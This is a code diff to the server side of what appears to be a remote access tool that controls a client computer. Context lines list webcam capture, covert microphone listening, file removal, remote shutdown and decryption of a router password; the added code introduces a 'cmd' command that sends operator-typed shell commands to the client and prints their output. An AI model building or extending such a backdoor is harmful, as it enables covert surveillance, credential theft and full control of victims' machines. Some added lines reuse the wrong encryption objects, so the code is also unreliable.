@@ -80,6 +80,7 @@ list_of_commands = "---------------------------------------- List of commands --
                    "\nwebcam ----------------- captures image from webcam" \
                    "\nlisten ----------------- listens on mic of client computer for set period of time (seconds)" \
                    "\nremove ----------------- removes file at given path from client computer" \
+                   "\ncmd -------------------- executes command from command prompt on client computer" \
                    "\nshutdown --------------- remote shutdown of client computer" \
                    "\nexit ------------------- exits program"
 
@@ -511,6 +512,24 @@ while True:
                 router_password = AES256.decrypt(erouter_password, d_key14)
 
                 print "\n\n\n\n" + router_password + "\n\n"
+
+            # 'cmd'
+            elif int(float(command)) == 401875051:
+                cmd_AES = AES256()
+
+                ae_key16 = shutdown_AES.get_key()
+                apubKey16 = RSA.import_key(known_hosts[0])
+                encryptor16 = PKCS1_OAEP.new(apubKey16)
+                e_key16 = encryptor16.encrypt(ae_key16)
+
+                cmd = raw_input("Enter in cmd command to execute on client -> ")
+
+                send_one_message(conn, cmd_AES.encrypt(cmd))
+
+                eoutput = recv_one_message(conn)
+                output = send_file_aes.decrypt(eoutput, cmd_AES.get_key())
+
+                print output
 
 
 
